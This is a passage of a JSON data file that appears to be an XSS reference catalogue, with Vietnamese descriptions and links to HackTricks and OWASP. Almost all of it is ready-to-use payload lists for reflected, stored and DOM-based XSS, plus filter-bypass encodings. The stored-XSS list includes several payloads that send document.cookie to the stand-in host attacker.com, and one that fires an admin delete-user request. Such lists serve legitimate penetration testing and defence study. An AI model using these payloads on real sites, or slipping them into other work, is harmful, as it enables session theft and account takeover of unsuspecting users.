        "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting",
        "https://www.acunetix.com/websitesecurity/xss/",
        "https://www.veracode.com/security/xss",
        "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)"
      ],
      "types": {
        "reflected_xss": {
          "name": "Reflected XSS",
          "description": "Script được reflect ngay lập tức từ request đến response",
          "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<frameset onload=alert('XSS')>",
            "<table background=javascript:alert('XSS')>",
            "<td background=javascript:alert('XSS')>"
          ],
          "bypass_techniques": [
            "HTML encoding: &lt;script&gt;alert('XSS')&lt;/script&gt;",
            "URL encoding: %3Cscript%3Ealert('XSS')%3C/script%3E",
            "Unicode encoding: \\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "Case variation: <ScRiPt>alert('XSS')</ScRiPt>",
            "String concatenation: <script>alert('X'+'S'+'S')</script>",
            "String.fromCharCode: <script>alert(String.fromCharCode(88,83,83))</script>",
            "Array join: <script>alert(['X','S','S'].join(''))</script>",
            "Mixed quotes: <script>alert(\"XSS\")</script>",
            "No quotes: <script>alert(XSS)</script>",
            "Backticks: <script>alert(`XSS`)</script>",
            "Hex encoding: <script>alert('\\x58\\x53\\x53')</script>",
            "Octal encoding: <script>alert('\\130\\123\\123')</script>",
            "Base64 encoding: <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "Template literals: <script>alert(`${'XSS'}`)</script>",
            "Function constructor: <script>new Function('alert(\\'XSS\\')')()</script>"
          ],
          "impact": "Steal cookies, session hijacking, deface website, redirect users",
          "severity": "High"
        },
        "stored_xss": {
          "name": "Stored XSS",
          "description": "Script được lưu trữ trên server và execute mỗi khi page được load",
          "payloads": [
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "<svg onload=fetch('/admin/delete-user?id=1')>",
            "<iframe src=javascript:alert('Stored XSS')>",
            "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
            "<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<script>XMLHttpRequest().open('GET','http://attacker.com/steal.php?cookie='+document.cookie)</script>",
            "<script>fetch('http://attacker.com/steal.php',{method:'POST',body:'cookie='+document.cookie})</script>",
            "<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://attacker.com/steal.php');xhr.send('cookie='+document.cookie)</script>",
            "<script>navigator.sendBeacon('http://attacker.com/steal.php','cookie='+document.cookie)</script>"
          ],
          "impact": "Persistent attack, affects all users, data theft, account takeover",
          "severity": "Critical"
        },
        "dom_xss": {
          "name": "DOM-based XSS",
          "description": "Vulnerability trong client-side code, script execute trong DOM",
          "payloads": [
            "#<img src=x onerror=alert('DOM XSS')>",
            "#<script>alert('DOM XSS')</script>",
            "#<svg onload=alert('DOM XSS')>",
            "#javascript:alert('DOM XSS')",
            "#<iframe src=javascript:alert('DOM XSS')>",
            "#<input onfocus=alert('DOM XSS') autofocus>",
            "#<body onload=alert('DOM XSS')>",
            "#<details open ontoggle=alert('DOM XSS')>",
            "?test=<img src=x onerror=alert('DOM XSS')>",
            "?search=<script>alert('DOM XSS')</script>"
          ],
          "impact": "Client-side attack, bypass server-side filters, session hijacking",
          "severity": "Medium"
        }
      },
